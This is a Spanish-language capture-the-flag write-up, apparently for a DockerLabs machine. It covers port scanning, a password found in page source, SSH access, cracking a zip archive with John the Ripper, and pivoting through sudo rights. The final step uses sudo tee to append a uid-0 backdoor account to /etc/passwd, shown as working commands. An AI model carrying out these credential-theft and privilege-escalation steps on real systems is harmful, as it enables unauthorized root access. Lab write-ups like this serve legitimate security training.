# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ecc3fb2c-167d-486e-8cdd-675ce694d1bf)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **80/tcp(HTTP):** Apache httpd
2.  **8899/tcp(SSH):** OpenSSH 6.6p1

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Sobre el Asucar Moreno.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ed12e4c5-06ca-4434-b859-f7f83dbfc3e8)

# Fase 2- Exploración

#### Rosa
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5ff59e6a-620e-4a99-b8d4-c7cbc16a4f94)
En la misma web nos aparece que despidieron a una tal `Rosa` en la otra empresa que trabajo, por no guardar bien sus contraseñas.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/062f2eb8-8c8c-41c7-9b7a-da6edaf9e9f3)
En la parte de formulario en el apartado de `Second Product` aparece un texto que dice `Brief description rosa`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/37134a9e-a328-4ff9-ace2-5f2287bf7407)

Buscando en el codigo encontramos una posible contraseña, `lacagadenuevo`.

#### Fase 3- Explotación

#### ssh
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c50b6c84-0f01-46b2-bb7b-85a364f65afc)

Y nos conectamos por ssh al puerto `8899` con el user `rosa`.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5d71c425-e546-465d-9fb6-b86546b64a87)

Despues de realizar el tratamiento de la TTY, y ver que no podemos ejecutar ningún binario como usuario root, procedemos a buscar entre los directorios encontrando un archivo .txt llamado `irresponsable.txt` en el directorio `/home/rosa/-/`.

#### Irresponsable.txt
```python
rosa@2ab830946bcd:~$ cat /home/rosa/-/irresponsable.txt 
Hola rosa soy juan como ya conocemos tus irresposabilidades de otras empresas te voy a dejar mi contraseña en un fichero .zip, captúralo para no volver a ser despedida.
Con cariño pero nos pones a todos en riesgo.
Seguro no trabajaste tambien en Decathlon ....
Un poco de acoso laboral......
```
El fichero .zip es la contraseña del usuario `Juan`.

#### backup_rosa.zip
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/028fa583-cafe-4c47-984d-c38a7f593527)
Nos transferimos el archivo de la maquina victima a nuestra maquina atacante con python. El comando es:
```python
Rosa: python3 -m http.server 9000
Atacante: wget http://172.18.0.2:9000/rosa/-/backup_rosa.zip
```

```python
❯>> zip2john backup_rosa.zip > zip.hash
ver 1.0 efh 5455 efh 7875 backup_rosa.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=25, decmplen=13, crc=6A3D5968 ts=1B29 cs=1b29 type=0
❯>> john zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
123123           (backup_rosa.zip/password.txt)     
1g 0:00:00:00 DONE 2/3 (2024-06-16 10:34) 33.33g/s 2046Kp/s 2046Kc/s 2046KC/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Y ya lo tenemos, la contraseña del .zip es 123123.

```python
unzip backup_rosa.zip
Archive:  backup_rosa.zip
[backup_rosa.zip] password.txt password: 123123
 extracting: password.txt 
❯ cat password.txt
   1   │ hackwhitbash
```

#### Juan
```python
rosa@2ab830946bcd:/home$ su juan
Password: hackwhitbash
juan@2ab830946bcd:/home$ 
```
Y somos el usuario `Juan`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/11caacf6-b95b-44a1-8417-fd517e30b9b6)
Con `Juan` podemos ejecutar los binarios `tree` y `cat` como el usuario `Carlos`.


![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2b023eeb-6ecd-4c8c-83fb-49c84a75b54e)

Usando el binario `tree` vemos que dentro de `/home/carlos/` existe un fichero llamado `password`
```python
juan@2ab830946bcd:/home$ sudo -u carlos /usr/bin/cat /home/carlos/password
chocolateado
```
Y leemos la password.

```python
juan@2ab830946bcd:/home$ su carlos
Password: 
carlos@2ab830946bcd:/home$ sudo -l
[sudo] password for carlos: 
Matching Defaults entries for carlos on 2ab830946bcd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on 2ab830946bcd:
    (ALL : NOPASSWD) /usr/bin/tee
```
Somos el usuario `Carlos` y podemos ejecutar el binario `tee` como usuario `root`.

```python
carlos@2ab830946bcd:/home$ openssl passwd -1 -salt "firstatack" "pass"
$1$firstata$KaJwXv0namG9OzwTOxpN61
carlos@2ab830946bcd:/home$ printf 'firstatack:$1$firstata$KaJwXv0namG9OzwTOxpN61:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
firstatack:$1$firstata$KaJwXv0namG9OzwTOxpN61:0:0:root:/root:/bin/bash
carlos@2ab830946bcd:/home$ su firstatack
Password: 
su: Authentication failure
carlos@2ab830946bcd:/home$ su firstatack
Password: 
root@2ab830946bcd:/home# whoami
root
root@2ab830946bcd:/home# 
```
Se creó una contraseña encriptada para el usuario "firstatack" usando `openssl`. Luego, se añadió este usuario al archivo `/etc/passwd` con privilegios de root. Tras un intento fallido de iniciar sesión, se logró acceder como root en el segundo intento.

